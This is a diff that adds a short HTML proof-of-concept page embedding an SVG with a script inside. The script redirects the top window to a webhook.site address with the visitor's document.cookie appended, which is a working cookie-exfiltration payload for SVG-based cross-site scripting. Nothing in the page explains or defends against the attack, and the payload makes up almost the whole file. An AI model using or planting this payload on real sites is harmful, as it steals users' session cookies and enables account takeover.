@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Embedded SVG PoC</title>
+</head>
+<body>
+
+  <h2>🔥 Embedded SVG with JavaScript</h2>
+
+  <!-- Embedded SVG as-is -->
+  <svg xmlns="http://www.w3.org/2000/svg">
+    <script>
+      setTimeout(() => {
+        try {
+          window.top.location = "https://webhook.site/76e7ae69-9687-4b42-8fdf-a423eed400a8?cookie=" + document.cookie;
+        } catch (e) {
+          alert("Blocked by browser: " + e);
+        }
+      }, 100);
+    </script>
+  </svg>
+
+</body>
+</html>
